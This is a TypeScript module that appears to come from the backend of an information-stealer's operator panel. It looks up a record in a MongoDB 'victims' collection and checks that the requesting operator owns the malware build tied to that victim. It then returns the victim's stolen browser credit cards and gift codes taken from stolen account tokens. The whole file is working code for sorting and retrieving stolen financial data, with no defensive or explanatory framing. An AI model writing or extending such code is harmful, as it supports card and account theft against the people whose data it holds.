import type { Db } from 'mongodb';
import type { ICreditCard, IGift } from '@/interfaces';
import { getBuildId } from '@/server';

export const getBilling = async (db: Db, owner: string, id: string, index?: number) => {
  const collection = db.collection('victims');

  const victim = await collection.findOne({
    tokens: {
      $elemMatch: {
        id: id
      }
    }
  });

  if (!victim) throw Error('This victim does not exist!');
  const build = await getBuildId(db, victim.id, owner);
  if (build.owner.id !== owner) throw Error('This victim is not your property');
  if (index && index > victim.tokens.length) index = 0;

  const creditcards: ICreditCard[] = victim.browsers.creditcards;
  const giftcodes: IGift[] = victim.tokens[index || 0].gifts;

  return {
    creditcards,
    giftcodes
  };
};
